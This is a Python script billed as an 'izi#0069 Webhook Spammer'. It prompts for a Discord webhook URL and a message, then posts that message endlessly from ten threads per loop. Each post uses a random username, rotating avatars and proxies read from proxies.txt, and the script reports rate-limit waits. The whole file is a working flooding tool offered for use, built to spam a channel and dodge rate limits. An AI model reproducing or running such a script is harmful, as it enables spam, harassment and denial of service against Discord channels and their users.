import threading, requests, os, random
from colored import fg, attr
from itertools import cycle
from pystyle import Write, Colors, Colorate
from time import strftime, gmtime
from datetime import datetime


Write.Input("""
                                                                                                 
█     █░▓█████  ▄▄▄▄    ██░ ██  ▒█████   ▒█████   ██ ▄█▀  ██████  ██▓███   ▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███  
▓█░ █ ░█░▓█   ▀ ▓█████▄ ▓██░ ██▒▒██▒  ██▒▒██▒  ██▒ ██▄█▒ ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒
▒█░ █ ░█ ▒███   ▒██▒ ▄██▒██▀▀██░▒██░  ██▒▒██░  ██▒▓███▄░ ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░▓██    ▓██░▒███   ▓██ ░▄█ ▒
░█░ █ ░█ ▒▓█  ▄ ▒██░█▀  ░▓█ ░██ ▒██   ██░▒██   ██░▓██ █▄   ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  
░░██▒██▓ ░▒████▒░▓█  ▀█▓░▓█▒░██▓░ ████▓▒░░ ████▓▒░▒██▒ █▄▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒
░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒ ░ ░   ░ ░  ░▒░▒   ░  ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░
  ░   ░     ░    ░    ░  ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░ ░  ░  ░  ░░         ░   ▒   ░      ░   ░      ░      ░     ░░   ░ 
    ░       ░  ░ ░       ░  ░  ░    ░ ░      ░ ░  ░  ░         ░                 ░  ░       ░          ░      ░  ░   ░         
                      
                                    Made by izi#0069
                                    github.com/iziHope
""", Colors.blue_to_purple, interval=0.005)

session = requests.Session()

#colors
a = fg('#a005ed')
b = attr('reset')
c = fg('#00D7D3')  

#webhook link
#web=input(f"{a}[{c}izi#0069{b}{a}]{b} {c}Webook{a}: ")
web = Write.Input(f"(put your webhook here) Webook: ", Colors.rainbow, interval=0.0025)

#webhook username
rando=["name","not","0001","not"]

#webhook message
#spam=input(f"{a}[{c}izi#0069{b}{a}]{b} {c}Message{a}: ")
spam = Write.Input(f"(your messages) Message: ", Colors.rainbow, interval=0.0025)

#webhook avatars
avatars = cycle(["https://media.discordapp.net/attachments/778720320035094550/808181516483166228/ec35695c38b97ea470a3d8761930f5d7.png", "https://preview.redd.it/nx4jf8ry1fy51.gif?format=png8&s=a5d51e9aa6b4776ca94ebe30c9bb7a5aaaa265a6", "https://icon-library.com/images/yellow-discord-icon/yellow-discord-icon-15.jpg"])

#proxies
proxies = open('proxies.txt').read().split('\n')

def ehook(webhook):
# while True:
                now = datetime.now()
                s = now.strftime("%S")
                x = f'{strftime(f"[%H:%M:{s}]", gmtime())} Sent Webhook {spam}'
                yes = f'{strftime(f"[%H:%M:{s}]", gmtime())}'
                proxy = cycle(proxies)
                
                einfo={
                    'username': random.choice(rando),
                    'content': spam,
                    "avatar_url": next(avatars)
                }
                r = session.post(webhook, json=einfo, proxies={"http": 'http://' + next(proxy)})
                if "retry_after" in r.text:
                    print(f"{a}{yes}{b} ratelimited sleeping for {a}{r.json()['retry_after']}{b} secs.")
                elif r.status_code == 204:
                    print(Colorate.Horizontal(Colors.rainbow,x))
                else:
                    pass

if __name__ == "__main__":
    os.system('cls & title izi#0069 Webhook Spammer - izi#0069')
    logo = """
  ██████  ██▓███   ▄▄▄       ███▄ ▄███▓
▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒
░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░
  ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ 
▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒
▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░
░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░
░  ░  ░  ░░         ░   ▒   ░      ░   
      ░                 ░  ░       ░   
                      
      """
    print(Colorate.Horizontal(Colors.rainbow,logo,3))
    while True:
     for i in range(10):
      threading.Thread(target=ehook, args=(web,)).start()